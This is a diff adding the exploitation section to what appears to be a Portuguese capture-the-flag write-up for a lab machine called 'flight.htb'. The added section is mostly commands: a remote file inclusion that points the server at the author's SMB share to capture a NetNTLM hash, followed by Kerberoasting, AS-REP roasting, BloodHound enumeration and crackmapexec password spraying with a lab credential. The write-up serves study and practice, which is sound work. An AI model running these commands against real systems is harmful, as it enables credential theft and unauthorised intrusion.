@@ -123,3 +123,46 @@ PWNED!
 
 ## Exploitation
 
+Para conseguir explorar essa vulnerabilidade, testei algumas coisas, no entanto, imaginei que fosse algum arquivo que eu deveria extrair e , na verdade se tratava de um RFI e, sendo assim, seria possível obter o hash de senha por meio do seguinte payload:
+
+    impacket-smbserver -smb2support smb .
+
+    http://school.flight.htb/index.php?view=//10.10.14.14/smb/test.txt
+    
+Dessa forma eu forço o sistema a me enviar o hash netNTLM da máquina e eu posso extraí-lo para quebrá-lo e dar sequência no ataque:
+
+![qownnotes-media-hMblhO](../../../media/qownnotes-media-hMblhO.png)
+
+![qownnotes-media-JCOaeL](../../../media/qownnotes-media-JCOaeL.png)
+
+Tentativa com Kerberoasting
+
+    impacket-GetUserSPNs 'flight.htb/svc_apache:S@Ss!K@*t13' -dc-ip 10.10.11.187 -request
+
+As Rep Roasting:
+
+    impacket-GetNPUsers -dc-ip 10.10.11.187 flight.htb/ -usersfile users.txt -format john -outputfile hashes
+    
+    enum4linux -u svc_apache -p 'S@Ss!K@*t13' 10.10.11.187
+     
+ Comecei a entrar em vários diretórios, mas de novo sem saber exatamente o que procurar no SMB, exceto pelo Groups.xml
+ Enumerei pelo bloodhound:
+ 
+     bloodhound-python -u svc_apache -p 'S@Ss!K@*t13' -d flight.htb -v --zip -c All -dc g0.flight.htb -ns 10.10.11.187
+     
+Sem sucesso. Password Spray:
+
+    crackmapexec ldap 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue
+    
+    crackmapexec winrm 10.10.11.187 -u users.txt -p passwords.txt --continue
+
+    crackmapexec winrm 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue
+
+![qownnotes-media-ZJWfVt](../../../media/qownnotes-media-ZJWfVt.png)
+
+
+Continuando a enumeração:
+
+    crackmapexec smb 10.10.11.187 -u 's.moon' -p 'S@Ss!K@*t13' --shares
+
+![qownnotes-media-Swipnb](../../../media/qownnotes-media-Swipnb.png)
